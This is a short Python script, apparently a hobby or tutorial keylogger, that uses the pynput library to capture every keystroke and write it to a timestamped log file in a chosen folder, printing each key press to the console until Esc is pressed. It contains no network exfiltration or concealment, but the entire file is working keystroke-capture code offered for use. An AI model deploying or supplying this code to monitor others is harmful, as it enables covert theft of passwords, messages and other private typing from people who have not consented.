import time
import os
from pynput.keyboard import Key, Listener
keys = []
path = '{URl to save the logs}' # e.g. 'C:/Users/username/Desktop/Keylogger/Logs/

try:
    os.mkdir(path)
    print("Folder %s created!" % path)
except FileExistsError:
    print("Folder %s already exists" % path)

filename = time.strftime('%Y-%m-%d_%H-%M-%S')

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open(path+filename+'.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write(' ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('Key') == -1:
                f.write(k)
            
def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
